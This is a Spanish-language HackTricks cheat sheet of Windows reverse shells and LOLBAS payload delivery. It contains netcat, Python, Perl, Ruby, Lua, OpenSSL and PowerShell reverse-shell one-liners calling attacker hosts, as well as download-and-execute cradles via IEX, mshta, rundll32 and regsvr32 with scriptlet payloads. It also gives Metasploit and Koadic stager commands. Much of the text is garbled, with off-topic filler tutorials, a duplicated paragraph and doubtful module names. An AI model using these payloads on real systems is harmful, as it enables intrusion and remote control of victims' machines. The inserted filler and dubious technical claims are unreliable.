# Shells - Windows

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Sigue a HackenProof**](https://bit.ly/3xrrDrL) **para aprender más sobre errores web3**

🐞 Lee tutoriales sobre errores web3

🔔 Recibe notificaciones sobre nuevas recompensas por errores

💬 Participa en discusiones comunitarias

## Lolbas

La página [lolbas-project.github.io](https://lolbas-project.github.io/) es para Windows lo que [https://gtfobins.github.io/](https://gtfobins.github.io/) es para Linux.\
Obviamente, **no hay archivos SUID ni privilegios de sudo en Windows**, pero es útil saber **cómo** algunos **binarios** pueden ser (ab)usados para realizar algún tipo de acción inesperada como **ejecutar código arbitrario**.

## NC
```bash
nc.exe -e cmd.exe <Attacker_IP> <PORT>
```
## SBD

**sbd** es un clon de Netcat, diseñado para ser portátil y ofrecer una fuerte encriptación. Se ejecuta en sistemas operativos tipo Unix y en Microsoft Win32. sbd cuenta con encriptación AES-CBC-128 + HMAC-SHA1 (por Christophe Devine), ejecución de programas (opción -e), elección del puerto de origen, reconexión continua con retraso y otras características interesantes. sbd solo admite comunicación TCP/IP. sbd.exe (parte de la distribución Kali Linux: /usr/share/windows-resources/sbd/sbd.exe) se puede cargar en un equipo con Windows como una alternativa a Netcat.

## Python
```bash
#Windows
C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.11.0.37', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
```
## Perl

Perl es un lenguaje de programación interpretado y de alto nivel que se utiliza comúnmente en el desarrollo de scripts y en la administración de sistemas. Es especialmente útil para la manipulación de texto y la automatización de tareas.

### Ejecución de comandos

Perl proporciona varias formas de ejecutar comandos en un sistema operativo Windows. A continuación se presentan algunos ejemplos:

#### Usando el operador de comillas invertidas

El operador de comillas invertidas (``) permite ejecutar comandos en un subproceso y capturar su salida. Por ejemplo:

```perl
my $output = `dir`;
print $output;
```

#### Usando la función `system()`

La función `system()` permite ejecutar comandos en un subproceso sin capturar su salida. Por ejemplo:

```perl
system("dir");
```

#### Usando la función `exec()`

La función `exec()` permite ejecutar comandos en el mismo proceso, reemplazando el programa actual. Por ejemplo:

```perl
exec("dir");
```

### Manipulación de archivos

Perl ofrece una amplia gama de funciones para manipular archivos en un sistema operativo Windows. A continuación se presentan algunos ejemplos:

#### Lectura de archivos

Para leer el contenido de un archivo, se puede utilizar la función `open()` junto con la función `readline()`. Por ejemplo:

```perl
open(my $file, "<", "archivo.txt") or die "No se pudo abrir el archivo: $!";
while (my $line = <$file>) {
    print $line;
}
close($file);
```

#### Escritura de archivos

Para escribir en un archivo, se puede utilizar la función `open()` junto con la función `print()`. Por ejemplo:

```perl
open(my $file, ">", "archivo.txt") or die "No se pudo abrir el archivo: $!";
print $file "Hola, mundo!\n";
close($file);
```

#### Manipulación de directorios

Para manipular directorios en un sistema operativo Windows, se puede utilizar la función `opendir()` junto con la función `readdir()`. Por ejemplo:

```perl
opendir(my $dir, ".") or die "No se pudo abrir el directorio: $!";
while (my $file = readdir($dir)) {
    print "$file\n";
}
closedir($dir);
```

### Conclusiones

Perl es una herramienta poderosa para la ejecución de comandos y la manipulación de archivos en un sistema operativo Windows. Con las funciones y operadores adecuados, es posible automatizar tareas y realizar diversas operaciones en el sistema.
```bash
perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## Ruby

Ruby es un lenguaje de programación dinámico y orientado a objetos que se utiliza ampliamente en el desarrollo web. Es conocido por su sintaxis elegante y su enfoque en la legibilidad del código. Ruby es compatible con una amplia gama de sistemas operativos, incluidos Windows, macOS y Linux.

### Instalación de Ruby en Windows

Para instalar Ruby en Windows, puedes seguir estos pasos:

1. Ve al sitio web oficial de Ruby en [https://www.ruby-lang.org](https://www.ruby-lang.org) y descarga la versión más reciente del instalador de Ruby para Windows.

2. Ejecuta el instalador descargado y sigue las instrucciones en pantalla para completar la instalación.

3. Una vez que la instalación haya finalizado, abre el símbolo del sistema (Command Prompt) y verifica que Ruby se haya instalado correctamente ejecutando el siguiente comando:

   ```
   ruby --version
   ```

   Deberías ver la versión de Ruby instalada en tu sistema.

### Ejecución de scripts Ruby

Para ejecutar un script Ruby en Windows, sigue estos pasos:

1. Abre el símbolo del sistema (Command Prompt) y navega hasta la ubicación del archivo de script Ruby.

2. Ejecuta el siguiente comando para ejecutar el script:

   ```
   ruby nombre_del_script.rb
   ```

   Asegúrate de reemplazar "nombre_del_script.rb" con el nombre real de tu archivo de script Ruby.

### Interacción con la consola de Ruby

Ruby proporciona una consola interactiva que te permite ejecutar código Ruby en tiempo real. Para abrir la consola de Ruby en Windows, sigue estos pasos:

1. Abre el símbolo del sistema (Command Prompt).

2. Ejecuta el siguiente comando para abrir la consola de Ruby:

   ```
   irb
   ```

   Ahora puedes ingresar y ejecutar código Ruby directamente en la consola.

### Recursos adicionales

Aquí hay algunos recursos adicionales que pueden ser útiles para aprender más sobre Ruby:

- [Sitio web oficial de Ruby](https://www.ruby-lang.org)
- [Ruby-Doc.org](https://ruby-doc.org) - Documentación oficial de Ruby
- [RubyGems.org](https://rubygems.org) - Repositorio de gemas de Ruby
- [Ruby on Rails](https://rubyonrails.org) - Framework de desarrollo web basado en Ruby
```bash
#Windows
ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## Lua

Lua es un lenguaje de programación ligero y de alto nivel que se utiliza comúnmente en el desarrollo de videojuegos y aplicaciones embebidas. Es conocido por su simplicidad, eficiencia y facilidad de integración con otros lenguajes. Lua se puede utilizar como un shell en sistemas operativos Windows para ejecutar comandos y scripts.

### Shell de Lua en Windows

Para utilizar Lua como un shell en Windows, primero debes descargar e instalar el intérprete de Lua desde el sitio web oficial. Una vez instalado, puedes abrir una ventana de comandos y ejecutar el comando `lua` para iniciar el shell de Lua.

El shell de Lua te permite ejecutar comandos y scripts de Lua directamente desde la línea de comandos. Puedes ingresar comandos de una sola línea o escribir scripts de varias líneas para realizar tareas más complejas.

### Ejecución de comandos de Lua

Para ejecutar un comando de Lua en el shell, simplemente escribe el código Lua y presiona Enter. El resultado de la ejecución se mostrará en la siguiente línea.

```lua
print("Hola, mundo!")
```

### Ejecución de scripts de Lua

Para ejecutar un script de Lua en el shell, primero debes crear un archivo de texto con extensión `.lua` que contenga el código Lua. Luego, puedes ejecutar el script utilizando el comando `dofile` seguido del nombre del archivo.

```lua
dofile("mi_script.lua")
```

### Ventajas del shell de Lua en Windows

El shell de Lua en Windows ofrece varias ventajas para los desarrolladores y hackers:

- Facilidad de uso: Lua es un lenguaje simple y fácil de aprender, lo que facilita su uso como shell.
- Integración con otros lenguajes: Lua se puede integrar fácilmente con otros lenguajes como C y C++, lo que permite aprovechar bibliotecas existentes.
- Eficiencia: Lua es conocido por su rendimiento eficiente y su bajo consumo de recursos.
- Flexibilidad: Lua es un lenguaje flexible que se adapta bien a diferentes tipos de proyectos y requisitos.

Con el shell de Lua en Windows, los hackers pueden aprovechar las capacidades de programación de Lua para realizar tareas de hacking y desarrollo de software de manera eficiente y efectiva.
```bash
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## OpenSSH

Atacante (Kali)
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
```
# Shells en Windows

Un shell es una interfaz de línea de comandos que permite a los hackers interactuar con un sistema operativo. En Windows, hay varias opciones de shells que se pueden utilizar para llevar a cabo actividades de hacking.

## PowerShell

PowerShell es un shell de línea de comandos y un lenguaje de scripting desarrollado por Microsoft. Es muy poderoso y flexible, lo que lo convierte en una herramienta popular para los hackers. PowerShell permite a los hackers ejecutar comandos y scripts en un sistema Windows, lo que les brinda un control completo sobre el sistema.

## Command Prompt (CMD)

El Command Prompt, también conocido como CMD, es el shell de línea de comandos predeterminado en Windows. Aunque no es tan poderoso como PowerShell, todavía se puede utilizar para llevar a cabo ciertas tareas de hacking. CMD permite a los hackers ejecutar comandos y scripts en un sistema Windows.

## Windows Subsystem for Linux (WSL)

El Windows Subsystem for Linux (WSL) es una característica de Windows 10 que permite a los usuarios ejecutar un entorno de Linux en Windows. Esto significa que los hackers pueden utilizar shells de Linux, como Bash, en un sistema Windows. WSL proporciona una gran cantidad de herramientas y utilidades de hacking que son populares en la comunidad de hacking.

## Meterpreter

Meterpreter es un shell de post-explotación que se utiliza en el marco de Metasploit. Es una herramienta muy poderosa que permite a los hackers obtener un control completo sobre un sistema Windows comprometido. Meterpreter proporciona una amplia gama de funcionalidades, como la captura de pantalla, la ejecución remota de comandos y la transferencia de archivos.

## Cobalt Strike

Cobalt Strike es una herramienta de post-explotación utilizada en pruebas de penetración. Proporciona un shell interactivo que permite a los hackers ejecutar comandos y scripts en un sistema Windows comprometido. Cobalt Strike también ofrece una variedad de características avanzadas, como la persistencia en el sistema comprometido y la comunicación cifrada.

## Conclusión

Los shells en Windows son herramientas esenciales para los hackers, ya que les permiten interactuar con un sistema operativo y llevar a cabo actividades de hacking. PowerShell, CMD, WSL, Meterpreter y Cobalt Strike son algunas de las opciones populares de shells en Windows. Cada uno tiene sus propias características y funcionalidades, por lo que es importante que los hackers estén familiarizados con ellos y los utilicen de manera efectiva en sus actividades de hacking.
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## Powershell

Powershell es una poderosa herramienta de línea de comandos y scripting desarrollada por Microsoft. Es especialmente útil para la administración y automatización de tareas en sistemas Windows.

### Ejecución de comandos

Powershell permite ejecutar comandos de forma interactiva o mediante scripts. Para ejecutar un comando, simplemente escriba el nombre del comando seguido de los argumentos necesarios. Por ejemplo:

```powershell
Get-Process
```

### Variables y operadores

En Powershell, se pueden utilizar variables para almacenar y manipular datos. Para asignar un valor a una variable, se utiliza el operador de asignación (=). Por ejemplo:

```powershell
$nombre = "Juan"
```

Powershell también admite una variedad de operadores, como operadores aritméticos (+, -, *, /), operadores de comparación (-eq, -ne, -lt, -gt), operadores lógicos (-and, -or, -not), entre otros.

### Estructuras de control

Powershell ofrece varias estructuras de control para controlar el flujo de ejecución de un script. Algunas de las estructuras de control más comunes son:

- `if`: se utiliza para ejecutar un bloque de código si se cumple una condición.
- `foreach`: se utiliza para iterar sobre una colección de elementos.
- `while`: se utiliza para ejecutar un bloque de código mientras se cumpla una condición.

### Funciones

En Powershell, se pueden definir funciones para encapsular un bloque de código y reutilizarlo en diferentes partes de un script. Para definir una función, se utiliza la palabra clave `function`, seguida del nombre de la función y los parámetros necesarios. Por ejemplo:

```powershell
function Saludar($nombre) {
    Write-Host "Hola, $nombre"
}
```

### Gestión de archivos y directorios

Powershell proporciona comandos y funciones para administrar archivos y directorios. Algunos de los comandos más utilizados son:

- `Get-ChildItem`: muestra los archivos y directorios en una ubicación determinada.
- `New-Item`: crea un nuevo archivo o directorio.
- `Copy-Item`: copia un archivo o directorio.
- `Remove-Item`: elimina un archivo o directorio.

Estas son solo algunas de las características y funcionalidades que ofrece Powershell. Con su amplia gama de comandos y capacidades de scripting, Powershell es una herramienta esencial para cualquier hacker o administrador de sistemas Windows.
```bash
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadString('http://10.222.0.26:8000/ipst.ps1')"
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
```
Proceso que realiza una llamada de red: **powershell.exe**\
Carga escrita en el disco: **NO** (_al menos en ningún lugar que pude encontrar usando procmon !_)
```bash
powershell -exec bypass -f \\webdavserver\folder\payload.ps1
```
Proceso que realiza una llamada de red: **svchost.exe**\
Carga escrita en el disco: **caché local del cliente WebDAV**

**Línea de comando:**
```bash
$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
Mshta is a Windows utility that allows you to execute HTML applications (HTAs) using the Microsoft HTML Application Host. HTAs are standalone applications that can be executed directly from the Windows shell without the need for a web browser.

### Usage

To execute a command using Mshta, you can use the following syntax:

```
mshta.exe javascript:command;
```

For example, to display a message box with the text "Hello, World!", you can use the following command:

```
mshta.exe javascript:alert('Hello, World!');
```

### Advantages

Mshta can be useful in scenarios where you want to execute arbitrary commands on a target system without relying on traditional command-line utilities. Since HTAs are executed by the HTML Application Host, they have the ability to interact with the Windows shell and perform various actions.

### Limitations

It's important to note that Mshta requires the target system to have the HTML Application Host installed. Additionally, some security measures, such as antivirus software, may flag the execution of HTAs as potentially malicious behavior.

### Detection

Detecting the execution of Mshta can be challenging, as it is a legitimate Windows utility. However, monitoring for suspicious command-line arguments or unusual network activity may help in identifying its usage.

### Mitigation

To mitigate the risks associated with Mshta, it is recommended to restrict its usage on systems where it is not required. Additionally, keeping the system and antivirus software up to date can help in detecting and preventing potential attacks involving Mshta.

For more information on different Powershell Shells, refer to the [Powershell Shells](../shells/powershell.md) section at the end of this document.
```bash
mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
```
Proceso que realiza una llamada de red: **mshta.exe**\
Carga escrita en disco: **caché local de IE**
```bash
mshta http://webserver/payload.hta
```
Proceso que realiza una llamada de red: **mshta.exe**\
Carga escrita en disco: **caché local de IE**
```bash
mshta \\webdavserver\folder\payload.hta
```
Proceso que realiza una llamada de red: **svchost.exe**\
Carga escrita en el disco: **caché local del cliente WebDAV**

#### **Ejemplo de shell inverso hta-psh (usa hta para descargar y ejecutar una puerta trasera de PowerShell)**
```markup
<scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
```
**Puedes descargar y ejecutar muy fácilmente un zombie Koadic utilizando el stager hta**

#### Ejemplo de hta
```markup
<html>
<head>
<HTA:APPLICATION ID="HelloExample">
<script language="jscript">
var c = "cmd.exe /c calc.exe";
new ActiveXObject('WScript.Shell').Run(c);
</script>
</head>
<body>
<script>self.close();</script>
</body>
</html>
```
#### **mshta - sct**

El método `mshta - sct` es una técnica de ejecución de comandos en Windows que aprovecha la utilidad `mshta.exe` y los archivos de script de componente (`sct`) para ejecutar código malicioso. Esta técnica es útil para evadir la detección de antivirus y ejecutar comandos sin dejar rastro en el disco.

##### **Pasos:**

1. Crear un archivo de script de componente (`sct`) que contenga el código malicioso. Este archivo puede ser generado utilizando herramientas como `msfvenom` o escribiendo el código manualmente.

2. Generar un archivo HTML que invoque el archivo de script de componente (`sct`) utilizando la utilidad `mshta.exe`. El código HTML debe contener una etiqueta `<script>` que haga referencia al archivo `sct`.

3. Ejecutar el archivo HTML utilizando el comando `mshta.exe`. Esto iniciará la ejecución del código malicioso contenido en el archivo de script de componente (`sct`).

##### **Ejemplo:**

```html
<html>
<head>
<script language="VBScript">
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run "calc.exe"
</script>
</head>
<body>
</body>
</html>
```

En este ejemplo, el archivo HTML invoca la calculadora de Windows (`calc.exe`) utilizando el objeto `WScript.Shell` de VBScript. Al ejecutar el archivo HTML con `mshta.exe`, se abrirá la calculadora en el sistema objetivo.

##### **Consideraciones:**

- Esta técnica puede ser detectada por soluciones de seguridad que monitorean la ejecución de `mshta.exe` o analizan el contenido de los archivos `sct`.

- Es importante tener en cuenta que esta técnica puede ser considerada maliciosa y su uso puede ser ilegal sin el consentimiento del propietario del sistema objetivo. Se recomienda utilizarla únicamente con fines educativos o en entornos controlados y autorizados.
```markup
<?XML version="1.0"?>
<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:C:\local\path\scriptlet.sct"")")) -->
<scriptlet>
<public>
</public>
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```
#### **Mshta - Metasploit**

Mshta is a Microsoft utility that allows the execution of HTML applications (HTAs) on Windows systems. It is often used by attackers to bypass security measures and execute malicious code.

Metasploit, a popular penetration testing framework, includes a module that leverages mshta to deliver payloads to target systems. This module, called "exploit/windows/browser/mshta", allows an attacker to create a malicious HTA file and deliver it to a victim's system.

To use this module, the attacker needs to set the "SRVHOST" and "SRVPORT" options to specify the IP address and port where the HTA file will be hosted. The "URIPATH" option can be used to specify a custom URI path for the HTA file.

Once the options are set, the attacker can run the exploit by executing the "exploit" command. This will start a web server hosting the HTA file. The attacker can then send a link to the victim, enticing them to open it.

When the victim opens the link, the HTA file is downloaded and executed on their system. This allows the attacker to gain remote access to the victim's machine and carry out further malicious activities.

It is important to note that the mshta module in Metasploit is just one example of how mshta can be used in an attack. Attackers can also manually craft HTA files and deliver them through other means, such as email attachments or malicious websites.

To protect against mshta-based attacks, it is recommended to keep systems and software up to date, use strong and unique passwords, and exercise caution when opening links or downloading files from untrusted sources.
```bash
use exploit/windows/misc/hta_server
msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109
msf exploit(windows/misc/hta_server) > set lhost 192.168.1.109
msf exploit(windows/misc/hta_server) > exploit
```

```bash
Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given in the output of metasploit
```
**Detectado por el defensor**

## **Rundll32**

[Ejemplo de "hello world" en Dll](https://github.com/carterjones/hello-world-dll)
```bash
rundll32 \\webdavserver\folder\payload.dll,entrypoint
```
Proceso que realiza una llamada de red: **svchost.exe**\
Carga útil escrita en disco: **caché local del cliente WebDAV**
```bash
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
```
Proceso que realiza una llamada de red: **rundll32.exe**\
Carga útil escrita en disco: **caché local de IE**

**Detectado por el defensor**

**Rundll32 - sct**
```bash
<?XML version="1.0"?>
<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
<scriptlet>
<public>
</public>
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```
#### **Rundll32 - Metasploit**

Rundll32 is a Windows utility that allows the execution of DLL files as if they were executable files. This can be leveraged by an attacker to execute malicious code on a target system.

Metasploit, a popular penetration testing framework, provides a module called `windows/local/hta` that can be used to generate a malicious HTA file. This file can then be executed using Rundll32 to achieve code execution on the target system.

To use this technique, follow these steps:

1. Generate the malicious HTA file using the `windows/local/hta` module in Metasploit:
```
msf > use windows/local/hta
msf exploit(windows/local/hta) > set LHOST <attacker IP>
msf exploit(windows/local/hta) > set LPORT <attacker port>
msf exploit(windows/local/hta) > exploit
```

2. Once the HTA file is generated, transfer it to the target system.

3. Execute the HTA file using Rundll32:
```
rundll32.exe <path to HTA file>,<entry point>
```

By leveraging Rundll32 and Metasploit's `windows/local/hta` module, an attacker can execute malicious code on a target system, potentially gaining unauthorized access or control. It is important to note that this technique should only be used for authorized penetration testing and not for malicious purposes.
```bash
use windows/smb/smb_delivery
run
#You will be given the command to run in the victim: rundll32.exe \\10.2.0.5\Iwvc\test.dll,0
```
**Rundll32 - Koadic**

Rundll32 is a Windows utility that allows the execution of DLL files as functions. This can be leveraged by attackers to load malicious DLLs and execute their code. One popular tool that utilizes this technique is Koadic.

Koadic is a post-exploitation RAT (Remote Access Trojan) that provides a command-and-control interface to interact with compromised systems. It uses the rundll32 utility to load its DLL payload and establish a backdoor on the target machine.

To use Koadic, the attacker first needs to generate a malicious DLL payload using the Koadic framework. This payload is then loaded using the rundll32 utility, which executes the code contained within the DLL. Once the payload is executed, the attacker gains remote access to the compromised system and can perform various malicious activities.

Koadic provides a wide range of features, including file system access, keylogging, screenshot capture, and network reconnaissance. It also supports multiple communication channels, such as HTTP, DNS, and ICMP, making it difficult to detect and block.

To prevent attacks utilizing Rundll32 and Koadic, it is important to implement strong security measures, such as regularly updating software, using strong passwords, and employing network segmentation. Additionally, monitoring network traffic and using intrusion detection systems can help detect and mitigate potential threats.
```bash
use stager/js/rundll32_js
set SRVHOST 192.168.1.107
set ENDPOINT sales
run
#Koadic will tell you what you need to execute inside the victim, it will be something like:
rundll32.exe javascript:"\..\mshtml, RunHTMLApplication ";x=new%20ActiveXObject("Msxml2.ServerXMLHTTP.6.0");x.open("GET","http://10.2.0.5:9997/ownmG",false);x.send();eval(x.responseText);window.close();
```
## Regsvr32

Regsvr32 es una utilidad de línea de comandos en Windows que se utiliza para registrar y desregistrar bibliotecas de vínculos dinámicos (DLL) y controles ActiveX en el Registro del sistema. Esta herramienta es especialmente útil para la instalación y desinstalación de componentes de software en el sistema operativo Windows.

### Uso básico

Para registrar una DLL o un control ActiveX, se utiliza el siguiente comando:

```
regsvr32 <ruta_del_archivo>
```

Donde `<ruta_del_archivo>` es la ubicación completa del archivo DLL o control ActiveX que se desea registrar.

Para desregistrar una DLL o un control ActiveX, se utiliza el siguiente comando:

```
regsvr32 /u <ruta_del_archivo>
```

Donde `<ruta_del_archivo>` es la ubicación completa del archivo DLL o control ActiveX que se desea desregistrar.

### Consideraciones de seguridad

Es importante tener en cuenta que Regsvr32 puede ser utilizado por atacantes para ejecutar código malicioso en un sistema comprometido. Por lo tanto, se recomienda tomar las siguientes precauciones:

- Verificar la integridad de los archivos DLL y controles ActiveX antes de registrarlos.
- Utilizar Regsvr32 solo en archivos de confianza y provenientes de fuentes confiables.
- Mantener el sistema operativo y las aplicaciones actualizadas para evitar vulnerabilidades conocidas que puedan ser explotadas mediante Regsvr32.

### Conclusiones

Regsvr32 es una herramienta útil para la instalación y desinstalación de DLL y controles ActiveX en sistemas Windows. Sin embargo, es importante utilizarla con precaución y tomar medidas de seguridad para evitar posibles ataques.
```bash
regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
```
Proceso que realiza una llamada de red: **regsvr32.exe**\
Carga útil escrita en disco: **caché local de IE**
```
regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
```
Proceso que realiza una llamada de red: **svchost.exe**\
Carga útil escrita en disco: **caché local del cliente WebDAV**

**Detectado por el defensor**

#### Regsvr32 -sct
```markup
<?XML version="1.0"?>
<!-- regsvr32 /u /n /s /i:http://webserver/regsvr32.sct scrobj.dll -->
<!-- regsvr32 /u /n /s /i:\\webdavserver\folder\regsvr32.sct scrobj.dll -->
<scriptlet>
<registration
progid="PoC"
classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</registration>
</scriptlet>
```
#### **Regsvr32 - Metasploit**

Regsvr32 is a Windows command-line utility used to register and unregister DLL files. It can also be used as a technique to execute arbitrary code on a target system. Metasploit, a popular penetration testing framework, provides a module called `regsvr32_command_delivery` that leverages this technique.

The `regsvr32_command_delivery` module generates a malicious DLL file and registers it using the regsvr32 utility. When the DLL is registered, the code within it is executed, allowing the attacker to gain control over the target system.

To use this module, you need to set the `DLL` option to the path of the DLL file you want to generate. You can also set the `CMD` option to specify the command you want to execute on the target system.

Once the options are set, you can run the module using the `exploit` command. The module will generate the DLL file, register it using regsvr32, and execute the specified command on the target system.

This technique can be useful in scenarios where you have limited access to the target system and want to execute commands without triggering any security alerts. However, it requires the target system to have the regsvr32 utility available.

#### **Regsvr32 - Metasploit**

Regsvr32 es una utilidad de línea de comandos de Windows utilizada para registrar y desregistrar archivos DLL. También se puede utilizar como una técnica para ejecutar código arbitrario en un sistema objetivo. Metasploit, un popular marco de pruebas de penetración, proporciona un módulo llamado `regsvr32_command_delivery` que aprovecha esta técnica.

El módulo `regsvr32_command_delivery` genera un archivo DLL malicioso y lo registra utilizando la utilidad regsvr32. Cuando el DLL se registra, el código dentro de él se ejecuta, lo que permite al atacante tomar el control del sistema objetivo.

Para utilizar este módulo, debes establecer la opción `DLL` en la ruta del archivo DLL que deseas generar. También puedes establecer la opción `CMD` para especificar el comando que deseas ejecutar en el sistema objetivo.

Una vez que se establecen las opciones, puedes ejecutar el módulo utilizando el comando `exploit`. El módulo generará el archivo DLL, lo registrará utilizando regsvr32 y ejecutará el comando especificado en el sistema objetivo.

Esta técnica puede ser útil en escenarios donde tienes acceso limitado al sistema objetivo y deseas ejecutar comandos sin activar alertas de seguridad. Sin embargo, requiere que el sistema objetivo tenga la utilidad regsvr32 disponible.
